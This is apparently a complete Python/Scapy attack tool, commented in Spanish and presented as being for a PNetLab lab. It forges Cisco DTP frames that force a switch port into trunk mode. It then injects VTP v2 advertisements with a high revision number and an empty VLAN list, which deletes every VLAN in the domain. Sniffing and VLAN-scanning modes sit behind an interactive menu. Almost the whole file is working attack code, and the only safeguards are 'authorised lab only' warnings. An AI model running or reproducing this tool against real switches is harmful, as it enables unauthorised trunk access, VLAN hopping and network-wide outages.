#!/usr/bin/env python3
"""
VTP Pwn Tool - Zero Day Edition
Laboratorio PNetLab - VTP v2 + DTP Trunk Negotiation
SOLO PARA ENTORNOS DE PRUEBA AUTORIZADOS
"""
from scapy.all import *
from scapy.contrib.dtp import *
import struct
import sys
import os
import time
from datetime import datetime

# ─────────────────────────────────────────
# COLORES
# ─────────────────────────────────────────
class C:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    WHITE = '\033[97m'

# ─────────────────────────────────────────
# LOGO
# ─────────────────────────────────────────
def print_logo():
    os.system('clear')
    logo = f"""
{C.BOLD}{C.YELLOW}
 ██╗   ██╗███████╗██╗
 ██║   ██║██╔════╝██║
 ███████║█████╗  ██║
 ██╔══██║██╔══╝  ██║
 ██║  ██║███████╗███████╗███████╗
 ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
{C.ENDC}{C.BOLD}{C.PURPLE}
 ███╗   ██╗ █████╗ ██╗   ██╗
 ████╗  ██║██╔══██╗██║   ██║
 ██╔██╗ ██║███████║███████║
 ██║╚██╗██║██╔══██║██╔══██║
 ██║ ╚████║██║  ██║██║  ██║
 ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝
{C.ENDC}{C.BOLD}{C.RED}
 ██████╗ ██╗    ██╗███╗   ██╗
 ██╔══██╗██║    ██║████╗  ██║
 ██████╔╝██║ █╗ ██║██╔██╗ ██║
 ██╔═══╝ ██║███╗██║██║╚██╗██║
 ██║     ╚███╔███╔╝██║ ╚████║
 ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
{C.ENDC}
{C.BOLD}{C.CYAN}╔══════════════════════════════════════════════════════════╗
║        VTP v2 + DTP ATTACK TOOL - PNetLab Edition        ║
║                                                          ║
║  {C.YELLOW}       AIN'T NO VLAN SURVIVING THIS ZERO DAY        {C.CYAN}   ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝{C.ENDC}

{C.RED} [!] SOLO PARA LABORATORIO PNETLAB AUTORIZADO
 [!] USO NO AUTORIZADO ES ILEGAL{C.ENDC}

{C.YELLOW} ══════════════════════════════════════════════════
      🖥️  ZERO DAY FOR LIFE - VTP+DTP EDITION 🖥️
 ══════════════════════════════════════════════════{C.ENDC}
"""
    print(logo)

def banner(txt):
    print(f"\n{C.BOLD}{C.PURPLE}{'═'*60}{C.ENDC}")
    print(f"{C.BOLD}{C.YELLOW}  {txt}{C.ENDC}")
    print(f"{C.BOLD}{C.PURPLE}{'═'*60}{C.ENDC}\n")

def ok(t):  print(f"{C.GREEN}[✓]{C.ENDC} {t}")
def info(t): print(f"{C.CYAN}[*]{C.ENDC} {t}")
def warn(t): print(f"{C.YELLOW}[!]{C.ENDC} {t}")
def err(t):  print(f"{C.RED}[✗]{C.ENDC} {t}")

# ─────────────────────────────────────────
# DTP - DYNAMIC TRUNKING PROTOCOL
# ─────────────────────────────────────────
def build_dtp_packet(iface="eth0", domain="javi.local"):
    """
    Construye un paquete DTP correcto usando scapy.contrib.dtp
    DTP Status values:
      - 0x02 = Access
      - 0x03 = Trunk (Desirable/Desirable)
      - 0x04 = Trunk (Desirable/Auto)
      - 0x81 = Auto/Auto
      - 0x82 = Auto/Desirable
      - 0x83 = Desirable/Desirable  ← Usamos este para forzar trunk
      - 0x84 = Desirable/Auto
      - 0xa5 = On/On (trunk incondicional)
    """
    src_mac = get_if_hwaddr(iface)
    eth  = Ether(dst="01:00:0c:cc:cc:cc", src=src_mac)
    llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
    snap = SNAP(OUI=0x00000c, code=0x2004)  # DTP = 0x2004

    try:
        dtp = DTP(
            version=0x01,
            tlvlist=[
                DTPDomain(length=len(domain) + 4, domain=domain.encode()),
                DTPStatus(length=5, status=b"\x03"),
                DTPType(length=5, dtptype=b"\xa5"),
                DTPNeighbor(length=10, neighbor=mac2str(src_mac))
            ]
        )
        return eth / llc / snap / dtp
    except:
        warn("Usando construcción manual de DTP (scapy.contrib.dtp no disponible)")
        domain_bytes = domain.encode()
        dtp_payload  = b'\x01'
        dtp_payload += struct.pack('>HH', 0x0001, len(domain_bytes) + 4) + domain_bytes
        dtp_payload += struct.pack('>HHB', 0x0002, 5, 0x03)
        dtp_payload += struct.pack('>HHB', 0x0003, 5, 0xa5)
        neighbor_mac = bytes.fromhex(src_mac.replace(':', ''))
        dtp_payload += struct.pack('>HH', 0x0004, 10) + neighbor_mac
        return eth / llc / snap / Raw(load=dtp_payload)


def negotiate_trunk(iface="eth0", domain="javi.local", duration=30):
    """
    Negocia DTP con el switch para establecer trunk.
    Envía DTP Desirable frames continuamente.
    """
    banner("🔥 MODO: DTP TRUNK NEGOTIATION")
    info(f"Interfaz  : {C.BOLD}{iface}{C.ENDC}")
    info(f"Duración  : {C.BOLD}{duration}s{C.ENDC}")
    info(f"Dominio VTP: {C.BOLD}{domain}{C.ENDC}")
    info(f"Modo DTP  : {C.BOLD}Desirable (0x03){C.ENDC}")
    info(f"Encap     : {C.BOLD}802.1Q (0xa5){C.ENDC}")
    print(f"\n{C.YELLOW}💻 Negotiating trunk with the switch...{C.ENDC}\n")

    pkt = build_dtp_packet(iface, domain)
    print(f"{C.CYAN}DTP Frame construido:{C.ENDC}")
    info(f"Destination MAC: 01:00:0c:cc:cc:cc (Cisco multicast)")
    info(f"Source MAC     : {get_if_hwaddr(iface)}")
    info(f"Domain         : {domain}")
    info(f"Status         : Desirable/Desirable (0x03)")
    info(f"Type           : 802.1Q (0xa5)")

    print(f"\n{C.CYAN}Paquete DTP:{C.ENDC}")
    pkt.show2()

    start_time = time.time()
    sent = 0
    print(f"\n{C.BOLD}{C.YELLOW}🔥 Sending DTP Desirable frames...{C.ENDC}\n")
    try:
        while time.time() - start_time < duration:
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
            elapsed = int(time.time() - start_time)
            print(f"{C.GREEN}[{elapsed:02d}s]{C.ENDC} Enviados {sent} frames DTP | "
                  f"{C.YELLOW}Negociando trunk...{C.ENDC}", end='\r')
            time.sleep(1)
        print(f"\n")
        ok(f"Enviados {sent} paquetes DTP Desirable")
        ok("Negociación completada")
        warn("El puerto debería estar en modo TRUNK ahora")
        print(f"\n{C.CYAN}Verifica en el switch:{C.ENDC}")
        print(f"  {C.WHITE}show interfaces [puerto] switchport{C.ENDC}")
        print(f"  {C.WHITE}show interfaces trunk{C.ENDC}")
        print(f"\n{C.YELLOW}🖥️  Trunk negotiated, Zero Day style! 🖥️{C.ENDC}")
    except KeyboardInterrupt:
        print(f"\n")
        warn(f"DTP negotiation interrumpida después de {sent} frames")

# ─────────────────────────────────────────
# CONSTRUCCIÓN DEL PAYLOAD VTP v2 REAL
# ─────────────────────────────────────────
def build_vtp_summary(domain: str, revision: int) -> bytes:
    """Summary Advertisement VTP v2"""
    domain_bytes = domain.encode('ascii')[:32].ljust(32, b'\x00')
    now = datetime.now()
    ts  = f"{now.day:02d}{now.month:02d}{now.year}{now.hour:02d}{now.minute:02d}{now.second:02d}"
    timestamp = ts.encode('ascii')[:12].ljust(12, b'\x00')

    payload  = struct.pack('B', 0x02)              # VTP Version 2
    payload += struct.pack('B', 0x01)              # Code: Summary Advert
    payload += struct.pack('B', 0x01)              # Followers: 1
    payload += struct.pack('B', len(domain))       # Domain name length
    payload += domain_bytes                         # Domain name (32 bytes)
    payload += struct.pack('>I', revision)          # Revision number (big-endian)
    payload += bytes([192, 168, 1, 100])            # Updater Identity
    payload += timestamp                             # Update timestamp (12 bytes)
    payload += bytes(16)                             # MD5 digest (zeros)
    return payload


def build_vtp_subset_empty(domain: str, revision: int) -> bytes:
    """Subset Advertisement VTP v2 con lista de VLANs VACÍA."""
    domain_bytes = domain.encode('ascii')[:32].ljust(32, b'\x00')

    payload  = struct.pack('B', 0x02)              # VTP Version 2
    payload += struct.pack('B', 0x02)              # Code: Subset Advert
    payload += struct.pack('B', 0x01)              # Sequence number
    payload += struct.pack('B', len(domain))       # Domain name length
    payload += domain_bytes                         # Domain name (32 bytes)
    payload += struct.pack('>I', revision)          # Revision number
    # Lista vacía = borrar VLANs
    return payload


def build_frame(payload: bytes) -> bytes:
    """Encapsula el payload VTP en un frame Ethernet con LLC/SNAP"""
    eth  = Ether(dst="01:00:0c:cc:cc:cc", src=RandMAC())
    llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
    snap = SNAP(OUI=0x00000c, code=0x2003)
    return bytes(eth / llc / snap) + payload

# ─────────────────────────────────────────
# OPCIÓN 1: SNIFFING VTP
# ─────────────────────────────────────────
def analizar_trafico(iface="eth0", count=10):
    banner("🖥️  MODO: RECON VTP - CAN'T STOP WON'T STOP")
    info(f"Interfaz : {C.BOLD}{iface}{C.ENDC}")
    info(f"Paquetes : {C.BOLD}{count}{C.ENDC}")
    print(f"\n{C.PURPLE}┌──────────────────────────────────────────┐")
    print(f"│  Escuchando tráfico VTP en la red...     │")
    print(f"└──────────────────────────────────────────┘{C.ENDC}\n")

    try:
        pkts = sniff(iface=iface, filter="ether dst 01:00:0c:cc:cc:cc",
                     count=count, timeout=30)
        ok(f"Capturados {len(pkts)} paquetes VTP/DTP\n")

        dominios = set()
        max_rev  = 0
        for i, pkt in enumerate(pkts):
            print(f"{C.BOLD}{C.YELLOW}┏━━ Paquete #{i+1} {'━'*38}{C.ENDC}")
            if Raw in pkt:
                raw = bytes(pkt[Raw].load)
                if len(raw) >= 8:
                    version = raw[0]
                    code    = raw[1]
                    if SNAP in pkt and pkt[SNAP].code == 0x2004:
                        print(f"{C.YELLOW}┃{C.ENDC} Protocolo : {C.CYAN}DTP{C.ENDC}")
                        print(f"{C.YELLOW}┃{C.ENDC} Trunk nego : {C.GREEN}Activo{C.ENDC}")
                    elif len(raw) >= 8:
                        dom_len  = raw[3] if raw[3] < 33 else 32
                        revision = struct.unpack('>I', raw[4:8])[0]
                        max_rev  = max(max_rev, revision)
                        code_str = {1:"Summary Advert",2:"Subset Advert",
                                    3:"Request",4:"Join"}.get(code, f"0x{code:02x}")
                        print(f"{C.YELLOW}┃{C.ENDC} Protocolo   : {C.CYAN}VTP{C.ENDC}")
                        print(f"{C.YELLOW}┃{C.ENDC} VTP Version : {C.GREEN}{version}{C.ENDC}")
                        print(f"{C.YELLOW}┃{C.ENDC} Tipo        : {C.GREEN}{code_str}{C.ENDC}")
                        print(f"{C.YELLOW}┃{C.ENDC} Revision    : {C.RED}{revision}{C.ENDC}")
                        if len(raw) >= 40 and dom_len > 0:
                            dom = raw[8:8+dom_len].decode('ascii', errors='ignore').rstrip('\x00')
                            dominios.add(dom)
                            print(f"{C.YELLOW}┃{C.ENDC} Dominio VTP : {C.CYAN}{dom}{C.ENDC}")
            print(f"{C.YELLOW}┗{'━'*50}{C.ENDC}\n")

        if dominios or max_rev > 0:
            banner("📊 RESUMEN RECON")
            if dominios:
                info(f"Dominios encontrados : {C.BOLD}{', '.join(dominios)}{C.ENDC}")
            if max_rev > 0:
                info(f"Revisión máxima      : {C.BOLD}{max_rev}{C.ENDC}")
                warn(f"Para el ataque usa revisión > {C.RED}{max_rev}{C.ENDC}")
        print(f"\n{C.YELLOW}💻 Domain captured, now let's exploit it! 💻{C.ENDC}")
    except Exception as e:
        err(f"Error: {e}")

# ─────────────────────────────────────────
# OPCIÓN 2: ATAQUE COMPLETO DTP + VTP
# ─────────────────────────────────────────
def ataque_completo(iface="eth0", domain="javi.local", revision=9999):
    banner("💣 MODO: FULL EXPLOIT ATTACK (DTP + VTP)")
    print(f"{C.RED}")
    print(" ╔═════════════════════════════════════════════════════════╗")
    print(" ║                                                         ║")
    print(f" ║  {C.YELLOW}🚨 FULL NETWORK TAKEOVER - ROOT THE SWITCH 🚨{C.RED}       ║")
    print(" ║                                                         ║")
    print(" ║  FASE 1: DTP Desirable → Negociar y forzar TRUNK       ║")
    print(" ║  FASE 2: VTP Summary   → Revision alta                 ║")
    print(" ║  FASE 3: VTP Subset    → Lista VLANs VACÍA             ║")
    print(" ║                                                         ║")
    print(" ║  Resultado: Puerto trunk + VLANs borradas               ║")
    print(" ║  SOLO para PNetLab - USO NO AUTORIZADO ES ILEGAL        ║")
    print(" ║                                                         ║")
    print(f" ╚═════════════════════════════════════════════════════════╝{C.ENDC}\n")

    c1 = input(f"{C.YELLOW}🖥️  ¿Ejecutar ataque COMPLETO en el LAB? (YES / ABORT): {C.ENDC}").strip().upper()
    if c1 == "ABORT":
        ok("Smart move! Stay outta trouble. 👍")
        return
    if c1 != "YES":
        err("Respuesta inválida - Cancelado")
        return

    c2 = input(f"{C.RED}Escribe 'ZERO DAY FOR LIFE' para continuar: {C.ENDC}").strip()
    if c2 != "ZERO DAY FOR LIFE":
        err("Passphrase incorrecta - Cancelado")
        return

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # FASE 1: DTP - Negociar TRUNK
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    print(f"\n{C.BOLD}{C.PURPLE}╔═══════════════════════════════════════════════╗")
    print(f"║       FASE 1: DTP TRUNK NEGOTIATION          ║")
    print(f"╚═══════════════════════════════════════════════╝{C.ENDC}\n")
    negotiate_trunk(iface, domain, duration=25)
    print(f"\n{C.GREEN}[✓] Trunk negotiation completada{C.ENDC}")
    print(f"{C.YELLOW}[!] Esperando 5s para que el switch estabilice el trunk...{C.ENDC}")
    time.sleep(5)

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # FASE 2 y 3: VTP ATTACK
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    print(f"\n{C.BOLD}{C.PURPLE}╔═══════════════════════════════════════════════╗")
    print(f"║          FASE 2-3: VTP VLAN WIPEOUT          ║")
    print(f"╚═══════════════════════════════════════════════╝{C.ENDC}\n")
    info(f"Dominio VTP : {C.BOLD}{domain}{C.ENDC}")
    info(f"Revisión    : {C.BOLD}{C.RED}{revision}{C.ENDC}")

    sum_payload    = build_vtp_summary(domain, revision)
    subset_payload = build_vtp_subset_empty(domain, revision)
    sum_frame      = build_frame(sum_payload)
    subset_frame   = build_frame(subset_payload)

    print(f"\n{C.RED}Lanzando VTP attack en 3...{C.ENDC}") ; time.sleep(1)
    print(f"{C.RED}2...{C.ENDC}")                           ; time.sleep(1)
    print(f"{C.RED}1...{C.ENDC}")                           ; time.sleep(1)
    print(f"\n{C.BOLD}{C.RED}🖥️  DROPPING THE VTP PAYLOAD... 🖥️{C.ENDC}\n")

    for i in range(5):
        sendp(Raw(load=sum_frame),    iface=iface, verbose=False)
        time.sleep(0.1)
        sendp(Raw(load=subset_frame), iface=iface, verbose=False)
        print(f"{C.YELLOW}💣{C.ENDC} Ronda #{i+1}: {C.GREEN}Summary + Subset enviados{C.ENDC}")
        time.sleep(0.5)

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # RESUMEN FINAL
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    print(f"\n{C.YELLOW}{'═'*60}{C.ENDC}")
    print(f"{C.BOLD}{C.YELLOW}✨ ATAQUE COMPLETO EJECUTADO - ZERO DAY FOR LIFE ✨{C.ENDC}")
    print(f"{C.YELLOW}{'═'*60}{C.ENDC}\n")
    ok("DTP: Trunk negociado exitosamente")
    ok("VTP: Summary Advertisement enviado (revisión alta)")
    ok("VTP: Subset Advertisement enviado (VLANs vacías)")
    print(f"\n{C.CYAN}Verifica en el switch:{C.ENDC}")
    print(f"  {C.WHITE}show interfaces [puerto] switchport{C.ENDC}  → modo trunk")
    print(f"  {C.WHITE}show interfaces trunk{C.ENDC}                → debe aparecer el puerto")
    print(f"  {C.WHITE}show vlan brief{C.ENDC}                      → VLANs borradas")
    print(f"  {C.WHITE}show vtp status{C.ENDC}                      → revisión actualizada")
    print(f"\n{C.YELLOW}🖥️  Can't patch, won't patch - VLANs exploited! 🖥️{C.ENDC}")
    print(f"{C.YELLOW}{'═'*60}{C.ENDC}\n")

# ─────────────────────────────────────────
# OPCIÓN 3: SOLO DTP (probar trunk)
# ─────────────────────────────────────────
def solo_dtp(iface="eth0", domain="javi.local"):
    banner("🔥 MODO: SOLO DTP - TRUNK NEGOTIATION")
    warn("Este modo SOLO negocia trunk, no borra VLANs")
    info("Útil para probar si el switch acepta DTP")
    info(f"Dominio VTP configurado: {C.BOLD}{domain}{C.ENDC}")
    c = input(f"\n{C.YELLOW}¿Continuar? (SI/NO): {C.ENDC}").strip().upper()
    if c != "SI":
        return
    dur = input(f"{C.YELLOW}Duración en segundos [30]: {C.ENDC}").strip() or "30"
    negotiate_trunk(iface, domain, int(dur))

# ─────────────────────────────────────────
# OPCIÓN 4: SOLO VTP (requiere trunk)
# ─────────────────────────────────────────
def vtp_attack_solo(iface="eth0", domain="javi.local", revision=9999):
    banner("💣 MODO: SOLO VTP ATTACK")
    info(f"Interfaz    : {C.BOLD}{iface}{C.ENDC}")
    info(f"Dominio VTP : {C.BOLD}{domain}{C.ENDC}")
    info(f"Revisión    : {C.BOLD}{C.RED}{revision}{C.ENDC}")
    warn("Este modo asume que el puerto YA está en trunk")
    warn("Si no está en trunk, usa la opción 2 (Ataque Completo)")
    c = input(f"\n{C.YELLOW}¿Continuar con VTP attack? (SI/NO): {C.ENDC}").strip().upper()
    if c != "SI":
        return

    sum_payload    = build_vtp_summary(domain, revision)
    subset_payload = build_vtp_subset_empty(domain, revision)
    sum_frame      = build_frame(sum_payload)
    subset_frame   = build_frame(subset_payload)

    print(f"\n{C.BOLD}{C.RED}🖥️  SENDING VTP PACKETS... 🖥️{C.ENDC}\n")
    for i in range(5):
        sendp(Raw(load=sum_frame),    iface=iface, verbose=False)
        time.sleep(0.1)
        sendp(Raw(load=subset_frame), iface=iface, verbose=False)
        print(f"{C.YELLOW}💣{C.ENDC} Ronda #{i+1}: {C.GREEN}VTP enviado{C.ENDC}")
        time.sleep(0.5)

    ok("VTP attack completado")
    warn("Verifica: show vlan brief")

# ─────────────────────────────────────────
# OPCIÓN 5: ESCANEO DE VLANs
# ─────────────────────────────────────────
def escanear_vlans(iface="eth0"):
    banner("🔍 MODO: VLAN DISCOVERY - RECON MODE")
    info(f"Interfaz : {C.BOLD}{iface}{C.ENDC}")
    info("Duración : 30 segundos")
    print(f"\n{C.PURPLE}┌──────────────────────────────────────────┐")
    print(f"│   Sniffing VLANs hacker style...         │")
    print(f"└──────────────────────────────────────────┘{C.ENDC}\n")

    try:
        pkts  = sniff(iface=iface, filter="vlan", timeout=30, count=300)
        vlans = {}
        for pkt in pkts:
            if Dot1Q in pkt:
                v = pkt[Dot1Q].vlan
                vlans[v] = vlans.get(v, 0) + 1

        if vlans:
            ok(f"Detectadas {len(vlans)} VLANs activas\n")
            print(f"{C.BOLD}{C.YELLOW}  VLAN ID  │  Paquetes  │  Nivel{C.ENDC}")
            print(f"{C.YELLOW}  ─────────┼────────────┼──────────────{C.ENDC}")
            for vid in sorted(vlans):
                nivel = "💻" * min(vlans[vid] // 10 + 1, 5)
                print(f"{C.CYAN}  {vid:^8}{C.ENDC}│{C.GREEN}  {vlans[vid]:^10}{C.ENDC}│  {nivel}")
            print(f"\n{C.YELLOW}🖥️  VLANs mapped, now let's exploit them! 🖥️{C.ENDC}")
        else:
            warn("No se detectaron VLANs en el tráfico")
    except Exception as e:
        err(f"Error: {e}")

# ─────────────────────────────────────────
# MENÚ PRINCIPAL
# ─────────────────────────────────────────
def menu():
    print(f"\n{C.BOLD}{C.PURPLE}╔═════════════════════════════════════════════════════╗")
    print(f"║          ZERO DAY VTP - MENÚ PRINCIPAL              ║")
    print(f"║            Can't Patch, Won't Patch                 ║")
    print(f"╚═════════════════════════════════════════════════════╝{C.ENDC}\n")
    print(f"  {C.YELLOW}[1]{C.ENDC} 🖥️  Sniffing - Analizar tráfico VTP/DTP")
    print(f"  {C.YELLOW}[2]{C.ENDC} 💣 Ataque COMPLETO {C.RED}(DTP trunk + VTP wipeout){C.ENDC}")
    print(f"  {C.YELLOW}[3]{C.ENDC} 🔥 Solo DTP - Negociar trunk únicamente")
    print(f"  {C.YELLOW}[4]{C.ENDC} 💥 Solo VTP - Borrar VLANs (requiere trunk activo)")
    print(f"  {C.YELLOW}[5]{C.ENDC} 🔍 Escanear VLANs activas")
    print(f"  {C.YELLOW}[6]{C.ENDC} 🚪 Salir")
    return input(f"\n{C.BOLD}{C.YELLOW}  ZeroDay> {C.ENDC}").strip()

# ─────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────
if __name__ == "__main__":
    if os.geteuid() != 0:
        err("Requiere privilegios ROOT")
        info("Ejecuta: sudo python3 vtp_pwn_tool.py")
        sys.exit(1)

    print_logo()
    time.sleep(1)

    while True:
        try:
            op = menu()

            if op == "1":
                iface = input(f"{C.YELLOW}  Interfaz [eth0]: {C.ENDC}").strip() or "eth0"
                n     = input(f"{C.YELLOW}  Paquetes [10]  : {C.ENDC}").strip() or "10"
                analizar_trafico(iface, int(n))

            elif op == "2":
                iface = input(f"{C.YELLOW}  Interfaz [eth0]       : {C.ENDC}").strip() or "eth0"
                dom   = input(f"{C.YELLOW}  Dominio VTP [javi.local]: {C.ENDC}").strip() or "javi.local"
                rev   = input(f"{C.YELLOW}  Revisión [9999]       : {C.ENDC}").strip() or "9999"
                try:
                    ataque_completo(iface, dom, int(rev))
                except ValueError:
                    err("Revisión inválida")

            elif op == "3":
                iface = input(f"{C.YELLOW}  Interfaz [eth0]       : {C.ENDC}").strip() or "eth0"
                dom   = input(f"{C.YELLOW}  Dominio VTP [javi.local]: {C.ENDC}").strip() or "javi.local"
                solo_dtp(iface, dom)

            elif op == "4":
                iface = input(f"{C.YELLOW}  Interfaz [eth0]       : {C.ENDC}").strip() or "eth0"
                dom   = input(f"{C.YELLOW}  Dominio VTP [javi.local]: {C.ENDC}").strip() or "javi.local"
                rev   = input(f"{C.YELLOW}  Revisión [9999]       : {C.ENDC}").strip() or "9999"
                try:
                    vtp_attack_solo(iface, dom, int(rev))
                except ValueError:
                    err("Revisión inválida")

            elif op == "5":
                iface = input(f"{C.YELLOW}  Interfaz [eth0]: {C.ENDC}").strip() or "eth0"
                escanear_vlans(iface)

            elif op == "6":
                print(f"\n{C.PURPLE}  ╔══════════════════════════════════════════╗")
                print(f"  ║   Thanks for using Zero Day VTP Tool    ║")
                print(f"  ║   Stay safe, hack responsibly!          ║")
                print(f"  ╚══════════════════════════════════════════╝{C.ENDC}")
                print(f"\n{C.YELLOW}  🖥️  ZERO DAY FOR LIFE! 🖥️{C.ENDC}\n")
                break
            else:
                err("Opción inválida")

            input(f"\n{C.BOLD}{C.YELLOW}  Presiona ENTER para continuar...{C.ENDC}")
            print_logo()

        except KeyboardInterrupt:
            print(f"\n\n{C.YELLOW}[!] Aborting mission, we out! 🖥️{C.ENDC}\n")
            break
        except Exception as e:
            err(f"Error inesperado: {e}")